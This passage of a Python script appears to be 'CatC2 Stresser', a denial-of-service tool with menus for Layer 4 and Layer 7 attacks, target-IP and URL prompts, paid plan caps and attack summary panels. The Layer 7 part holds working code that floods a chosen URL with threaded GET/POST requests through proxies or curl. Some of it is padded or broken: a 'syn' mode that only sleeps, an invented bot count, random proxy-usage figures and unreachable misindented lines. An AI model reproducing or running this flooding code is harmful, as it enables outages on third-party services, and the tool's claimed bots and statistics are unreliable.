                print(f"\r{accent('Requests:')}{grey(f' {request_count} ')}| {accent('Time Left:')}{grey(f' {int(end - time.time())}s')}", end="")
                time.sleep(0.05)

        except Exception as e:
            print(accent(f"Error: {e}"))

    with request_lock:
        active_bots -= 1  
def show_attack_summary(ip, port, duration, method):
    global request_count, active_bots


    ping_avg = "N/A"
    try:
        ping_cmd = ["ping", "-c", "4", ip]
        result = subprocess.run(ping_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        for line in result.stdout.splitlines():
            if "avg" in line or "rtt" in line:
                parts = line.split("/")
                if len(parts) >= 5:
                    ping_avg = parts[4] + ""
    except:
        ping_avg = "Ping failed"

    api_proxy_usage = max(1, int(request_count * random.uniform(0.9, 1.1)))

    
    print("\n" + "┌" + "─"*41 + "┐")
    print(f"│        {accent('L4 ATTACK PANEL')}               │")
    print("├" + "─"*41 + "┤")
    print(f"│   {accent('Target IP')}       : {grey(ip)}       │")
    print(f"│   {accent('Port')}            : {grey(str(port))}  │")
    print(f"│   {accent('Method')}          : {grey(method.upper())} │")
    print(f"│   {accent('Attack Time')}     : {grey(str(duration) + ' sec')} │")
    print(f"│   {accent('Ping Statistic')}  : {grey(ping_avg)}  │")
    print(f"│   {accent('API Proxy Usage')} : {grey(str(api_proxy_usage))}   │")
    print(f"│   {accent('Requests Sent')}   : {grey(str(request_count))}     │")
    print("└" + "─"*41 + "┘")

# ------------------- Start attack --------------------------
def start_attack(ip, port, duration, method, threads=299, request_type="GET"):
    global request_count, active_bots, MAX_THREADS
    request_count = 0
    active_bots = 0

    # Mode selection before attack starts
    print(grey("\nChoose attack mode:"))
    print(grey("1. Attack Log (live Requests counter)"))
    print(grey("2. Flooding Mode (live flooding logs)"))
    while True:
        mode_choice = input(accent("cat@catc2 ~  ")).strip()
        if mode_choice in ["1", "2"]:
            mode_choice = int(mode_choice)
            break
        print(accent("Invalid option. Choose 1 or 2."))

    thread_list = []
    # respect plan thread cap
    allowed = min(threads, MAX_THREADS)
    for _ in range(min(allowed, MAX_THREADS)):
        t = threading.Thread(target=attack_thread, args=(ip, port, min(duration, MAX_DURATION), method, request_type, mode_choice))
        t.daemon = True
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    # Show final summary 
        show_attack_summary(ip, port, duration, method)
        break
        print()
    input(accent("Loading..."))
                        
# ============================================================
# LAYER 7 
# ============================================================
# ============================================================

request_count = 0
active_bots = 5882
request_lock = threading.Lock()

def connect_to_proxy():
    proxy = random.choice(PROXY_LIST)
    print(grey("Connecting to proxy..."))
    time.sleep(1)
    print(accent(f"Connected to Proxy: {proxy}"))
    return {"http": proxy, "https": proxy}

def layer7_attack():
    global request_count, active_bots
    clear_screen()
    print(accent("Made by: Lemonaidd"))

    
    print(bold(""" 
⠀⠀⠀⠀⠀⢸⣿⣷⣶⣤⣀⣤⣴⣶⣶⣶⣶⣦⣤⣀⣤⣶⣾⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
⠀⠀⠠⣤⣀⡀⠹⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⠃⢀⣀⣤⠄⠀⠀
⢀⠤⢤⣤⣬⣙⠳⣿⣿⡿⠀⢀⠀⠈⣿⣿⠁⠀⡀⠈⣿⣿⣿⠞⣋⣥⣤⠤⠤⡀
⠀⢀⡤⠤⢤⣼⣿⣿⣿⣿⡀⠸⠀⣠⣿⣿⣄⠐⠇⢀⣿⣿⣿⣿⣧⡤⠤⢤⡀⠀
⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠛⠿⢿⣿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⣿⡿⠻⠛⠀⠀⠀                                 
                         _/      
    _/_/_/    _/_/_/  _/_/_/_/   
 _/        _/    _/    _/        
_/        _/    _/    _/         
 _/_/_/    _/_/_/      _/_/                                          
"""))

    link = input(grey("Target URL: "))
    num_threads = int(input(grey("Threads: ")))
    attack_method = input(grey("Method (http / https / syn / curl / Skycurl): ")).strip().lower()

    request_type = None
    if attack_method in ["http", "https", "curl"]:
        request_type = input(grey("Request type (GET / POST): ")).strip().upper() or "GET"
        if request_type not in ["GET", "POST"]:
            print(accent("Invalid request type. Use GET or POST."))
            return

    attack_duration = int(input(grey("Attack duration (seconds): ")))
    proxy = connect_to_proxy()
    end_time = time.time() + attack_duration

    print(grey("\nChoose attack mode:"))
    print(grey("1. Attack Log (live Requests counter)"))
    print(grey("2. Flooding Mode (live flooding logs)"))
    while True:
        mode_choice = input(accent("cat@catc2 ~  ")).strip()
        if mode_choice in ["1", "2"]:
            mode_choice = int(mode_choice)
            break
        print(accent("Invalid option. Choose 1 or 2."))

    def attack_thread_layer7():
        global request_count, active_bots
        with request_lock:
            active_bots += 1
        session = requests.Session()

        while time.time() < end_time:
            try:
                if attack_method in ["http", "https"]:
                    if request_type == "POST":
                        session.post(link, proxies=proxy, timeout=3)
                    else:
                        session.get(link, proxies=proxy, timeout=3)
                elif attack_method == "curl":
                    import subprocess
                    subprocess.run(["curl", "-X", request_type, link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif attack_method == "syn":
                    time.sleep(0.5)

                with request_lock:
                    request_count += 1

                if mode_choice == 1:
                    print(f"\r{accent('Requests:')}{grey(f' {request_count} ')}| {accent('Time Left:')}{grey(f' {int(end_time - time.time())}s')}", end="")
                elif mode_choice == 2:
                    if attack_method in ["http", "https"]:
                        print(grey(f"{request_type} Request sent to {link}"))
                    elif attack_method == "curl":
                        print(grey(f"CURL {request_type} sent to {link}"))
                    elif attack_method == "syn":
                        print(grey(f"SYN flood to {link}"))

            except requests.RequestException:
                print(accent(f"Error sending to {link}"))

        with request_lock:
            active_bots -= 1

    threads = []
    allowed_threads = min(num_threads, MAX_THREADS)
    for _ in range(min(allowed_threads, MAX_THREADS)):
        t = threading.Thread(target=attack_thread_layer7)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    api_proxy_usage = max(1, int(request_count * random.uniform(0.9, 1.1)))
    print("\n" + "┌" + "─"*41 + "┐")
    print(f"│        {accent('L7 ATTACK PANEL')}               │")
    print("├" + "─"*41 + "┤")
    print(f"│   {accent('Target URL')}      : {grey(link)}       │")
    print(f"│   {accent('Method')}          : {grey(attack_method.upper())}                │")
    print(f"│   {accent('Threads')}         : {grey(str(num_threads))}                │")
    print(f"│   {accent('API Proxy Usage')} : {grey(str(api_proxy_usage))}              │")
    print(f"│   {accent('Requests Sent')}   : {grey(str(request_count))}              │")
    print("└" + "─"*41 + "┘")
    print(accent("\nAttack Stopped"))

def show_methods_layer7():
    clear_screen()
    print(accent("Made by: Lemonaidd"))
    print(bold("""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣦⡀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠙⠿⣦⡀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠈⢻⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠙⢿⣦⡀⠀⠀⢀⣴⣿⣿
⣿⣿⣿⣿⠟⠋⠀⠀⠀⣀⡄⠀⠀⠀⠀⠀⠀⠀⠘⢿⣦⣤⣽⣿⣦⣴⣿⣿⣿⣿
⣿⣿⣿⡇⠀⠀⠀⢀⣾⣿⠟⠀⠀⣴⣦⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡟⠸⣧⠀⠀⠀⠀⠈⠁⠰⠶⠀⠿⠿⡇⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠀⠘⢷⡄⠀⠀⢀⣴⣶⣤⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠀⠀⠈⠻⣦⡀⠀⠈⠙⠛⠂⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⠀⠀⠀⠈⠻⣦⣄⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣦⣀⠀⠀⠀⠀⠙⠻⢶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""))
    print(accent("=== Layer 7 Methods ==="))
    print(grey("\n[All Methods]"))
    print(" - http\n - https\n - cURL\n - SkycURL\n - syn ")
    print()
    input(accent("Press Enter..."))

def layer7_menu():
    while True:
        clear_screen()
        print(accent("Made by: Lemonaidd"))
        print(bold("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠙⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣦⡀⠙⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣦⣀⠙⢿⣦⡀⠙⢿⣿⣿⣿⣿⣿⣷⡄⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣦⡀⠙⢿⣿⣿⡿⠋⠀⠀
⠀⠀⠀⠀⣠⣴⣿⣿⣿⠿⢻⣿⣿⣿⣿⣿⣿⣿⣧⡀⠙⠛⠂⠀⠙⠋⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⡿⠁⠀⣠⣿⣿⠋⠙⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣇⠘⣿⣿⣿⣿⣷⣾⣏⣉⣿⣀⣀⢸⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣧⡈⢻⣿⣿⡿⠋⠉⠛⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣷⣄⠙⢿⣿⣷⣦⣤⣽⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣿⣿⣷⣄⠙⠻⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⠿⣿⣿⣿⣿⣦⣄⡉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""))
        print(grey("1. Run Attack\n2. Show All Methods\n3. Back"))
        opt = input(accent("cat@catc2 ~  ")).strip()

        if opt == "1":
            layer7_attack()
            input(accent("Press Enter to return..."))
        elif opt == "2":
            show_methods_layer7()
        elif opt == "3":
            break
        else:
            print(accent("Invalid option."))
            time.sleep(1)

# ============================================================
# MAIN MENU
# ============================================================
def print_menu():
    clear_screen()
    print(dim(r"""
Made by: Lemonaidd   
          ⣤⡶⢶⣦⡀
⠀⠀⠀⣴⡿⠟⠷⠆⣠⠋⠀⠀⠀⢸⣿
⠀⠀⠀⣿⡄⠀⠀⠀⠈⠀⠀⠀⠀⣾⡿
⠀⠀⠀⠹⣿⣦⡀⠀⠀⠀⠀⢀⣾⣿
⠀⠀⠀⠀⠈⠻⣿⣷⣦⣀⣠⣾⡿
⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⡿⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⢠⠏⡆⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣀⡀
⠀⠀⠀⠀⠀⡟⢦⡀⠇⠀⠀⣀⠞⠀⠀⠘⡀⢀⡠⠚⣉⠤⠂⠀⠀⠀⠈⠙⢦⡀
⠀⠀⠀⠀⠀⡇⠀⠉⠒⠊⠁⠀⠀⠀⠀⠀⠘⢧⠔⣉⠤⠒⠒⠉⠉⠀⠀⠀⠀⠹⣆
⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⣤⠶⠶⢶⡄⠀⠀⠀⠀⢹⡆
⠀⣀⠤⠒⠒⢺⠒⠀⠀⠀⠀⠀⠀⠀⠀⠤⠊⠀⢸⠀⡿⠀⡀⠀⣀⡟⠀⠀⠀⠀⢸⡇
⠈⠀⠀⣠⠴⠚⢯⡀⠐⠒⠚⠉⠀⢶⠂⠀⣀⠜⠀⢿⡀⠉⠚⠉⠀⠀⠀⠀⣠⠟
⠀⠠⠊⠀⠀⠀⠀⠙⠂⣴⠒⠒⣲⢔⠉⠉⣹⣞⣉⣈⠿⢦⣀⣀⣀⣠⡴⠟
  ____      _    ____ ____  
 / ___|__ _| |_ / ___|___ \ 
| |   / _` | __| |     __) |
| |__| (_| | |_| |___ / __/ 
 \____\__,_|\__|\____|_____|
 
⠀⠀⠀⠀
    """))
    show_bots_online()
    print()
    print(grey(
          "1. Layer 4 Menu\n"
          "2. Layer 7 Menu\n"
          "3. Active Bots\n"
          "4. Methods\n"
          "5. Exit\n"
          "6. About"))

def about_screen():
    clear_screen()
    print(accent("About STRESSER"))
    print(grey("\nVersion: v3.0"))
    print(grey("Author: Lemonaidd"))
    print(grey("Contact: @Sql1337(Tiktok) "))
    print(grey(".  ─── = DDosed by a cat = ───  ."))
    print(grey(" - CatC2 is a versatile DDoS stresser tool for simulating network loads, compatible with Android, iPhone, and Linux devices."))
    print(grey(" - Uses http and Socks5 Proxies"))
    print(grey(" - SSH bots and new methods often."))
    print(grey(" - fresh bots & fresh proxies often"))
    print(accent(" - To upgrade your plan contact Lemonaidd"))
    print()
    input(accent("Press Enter..."))

def main_menu():
    while True:
        print_menu()
        opt = input(accent("cat@catc2 ~ ")).strip()
        if opt == "1":
            ip = input(grey("Target IP: "))
            port = int(input(grey("Port: ")))
            duration = int(input(grey("Duration: ")))
            method = method_selection()
            start_attack(ip, port, duration, method)
            input(accent("Press Enter to return..."))
        elif opt == "2":
            layer7_menu()
        elif opt == "3":
            show_active_bots()
        elif opt == "4":
            show_methods()
        elif opt == "5":
            exit()
        elif opt == "6":
            about_screen()
        else:
            print(accent("Invalid option."))
            time.sleep(1)

# ============================================================
# START SCRIPT
# ============================================================
if __name__ == "__main__":
    clear_screen()
    print(accent(" ᓚᘏᗢ CATC2 STRESSER"))
    if valid_passkey():
        main_menu()
    else:
        print(accent("Invalid passkey."))


